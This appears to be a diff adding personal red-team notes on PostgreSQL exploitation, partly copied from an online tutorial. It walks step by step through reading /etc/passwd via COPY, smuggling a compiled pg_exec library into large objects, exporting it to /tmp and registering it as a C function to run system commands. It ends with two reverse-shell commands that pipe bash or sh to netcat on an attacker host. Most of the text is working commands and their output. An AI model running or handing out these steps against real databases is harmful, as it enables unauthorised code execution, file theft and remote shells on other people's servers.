@@ -1,0 +1,150 @@
+## Postgresql exploitation
+
+psql --> cli
+
+psql -U Postgres
+
+\l list DB's
+\d Describe table
+\c connect DB
+
+REMOTE CODE EXEC STEPS -
+
+/usr/local/pgsql/bin/psql -U postgres
+
+\include upload.sql (MAke sure you run from /tmp or wherever the upload.sql and xaaaa files are)
+
+select lo_export(16411, '/tmp/pg_exec.so');
+
+CREATE FUNCTION sys(cstring) RETURNS int AS '/tmp/pg_exec.so', 'pg_exec' LANGUAGE 'c' STRICT;
+
+For shell
+
+select sys('mknod /tmp/backpipe q');
+select sys('/bin/bash 0</tmp/backpipe | nc attacker_ip 4444 1>/tmp/backpipe');
+
+### Link to https://www.unix-ninja.com/p/postgresql_for_red_teams
+
+
+Command execution
+Postgres abstracts certain system level functions which it will expose to the database operator. We can easily discover, for example, the contents of the process' working directory using the following:
+
+postgres=# select pg_ls_dir('./');
+    pg_ls_dir
+----------------------
+PG_VERSION
+base
+global
+pg_clog
+pg_commit_ts
+pg_dynshmem
+pg_logical
+pg_multixact
+pg_notify
+pg_replslot
+pg_serial
+pg_snapshots
+pg_stat
+pg_stat_tmp
+pg_subtrans
+pg_tblspc
+pg_twophase
+pg_xlog
+postgresql.auto.conf
+postmaster.pid
+postmaster.opts
+(21 rows)
+We can take this a step farther and read the contents of these files.
+
+postgres=# select pg_read_file('PG_VERSION');
+ pg_read_file
+--------------
+ 9.6         +
+
+(1 row)
+We can also choose the offset we want to start reading at, and the number of bytes we want to read. For example, let's read a specific 12 bytes near the end of postgresql.auto.conf.
+
+postgres=# select pg_read_file('postgresql.auto.conf', 66, 12);
+ pg_read_file
+--------------
+ ALTER SYSTEM
+(1 row)
+But there are limitations to the pg_read_file() function.
+
+postgres=# select pg_read_file('/etc/passwd');
+ERROR:  absolute path not allowed
+postgres=# select pg_read_file('../../../../etc/passwd');
+ERROR:  path must be in or below the current directory
+Don't despair. We can create a new table and COPY the contents of files on disk into it. Then, we can query the table to see the contents.
+
+postgres=# create table docs (data TEXT);
+CREATE TABLE
+postgres=# copy docs from '/etc/passwd';
+COPY 52
+postgres=# select * from docs limit 10;
+                       data
+---------------------------------------------------
+ root:x:0:0:root:/root:/bin/bash
+ daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+ bin:x:2:2:bin:/bin:/usr/sbin/nologin
+ sys:x:3:3:sys:/dev:/usr/sbin/nologin
+ sync:x:4:65534:sync:/bin:/bin/sync
+ games:x:5:60:games:/usr/games:/usr/sbin/nologin
+ man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+ lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+ mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+ news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+(10 rows)
+Getting a reverse shell
+So now we have access to our service, we can read from files on disk. Now it's time to see if we can launch a reverse shell.
+
+Again, Metasploit has a pretty nice payload to abstract this whole process, but what's the fun in that?
+
+[Dionach] has a great little library they have written to provide a function called pgexec(). Can you guess what it does? pgexec needs to be compiled against the same major and minor versions as the running Postgres instance. You should be able to just query Postgres for this information.
+
+postgres=# select version();
+But he also provides prebuilt binaries for many common versions. Let's just grab one of those.
+
+$ curl https://github.com/Dionach/pgexec/blob/master/libraries/pg_exec-9.6.so -O pg_exec.so
+We now have our library, but how do we get it to our target? Fortunately, we can generate LOIDs in Postgres to store this data and then try to write it to disk.
+
+postgres=# select lo_creat(-1);
+ lo_creat
+----------
+    16391
+(1 row)
+Make a note of the lo_creat ID which was generated. You will need this in the examples below.
+
+However, there is a caveat here. LOID entries can be a maximum of 2K, so we need to spit the payload. We can do this in our bash shell (just be sure to use the some working directory as you are using for psql.)
+
+$ split -b 2048 pg_exec.so
+Now we can script the SQL statements we need to upload all the pieces of this payload. In this example, we are piping them all into a file called upload.sql. Remember to replace ${LOID} with the ID you grabbed earlier.
+
+$ CNT=0; for f in x*; do echo '\set c'${CNT}' `base64 -w 0 '${f}'`'; echo 'INSERT INTO pg_largeobject (loid, pageno, data) values ('${LOID}', '${CNT}', decode(:'"'"c${CNT}"'"', '"'"'base64'"'"'));'; CNT=$(( CNT + 1 )); done > upload.sql
+With our SQL file in hand, we can include these statements straight from disk into psql. (Again, this assumes that upload.sql is in the same working directory as psql.)
+
+postgres=# \include upload.sql
+INSERT 0 1
+INSERT 0 1
+INSERT 0 1
+INSERT 0 1
+INSERT 0 1
+Finally, we save our LOID to disk. (Change 16391 to match your LOID.)
+
+postgres=# select lo_export(16391, '/tmp/pg_exec.so');
+ lo_export
+-----------
+         1
+(1 row)
+Create our new function using the library we just copied to disk.
+
+postgres=# CREATE FUNCTION sys(cstring) RETURNS int AS '/tmp/pg_exec.so', 'pg_exec' LANGUAGE 'c' STRICT;
+CREATE FUNCTION
+Excellent! We should now be able to execute remote commands to our target. pg_exec() won't display the output, so we are just going to run some blind commands to setup our shell.
+
+First, make sure there's a listener on your local machine. From another shell window, we can set this up with Ncat or Netcat.
+
+$ nc -l -p 4444
+Execute the reverse shell.
+
+postgres=# select sys('nc -e /bin/sh <IP> <PORT>');
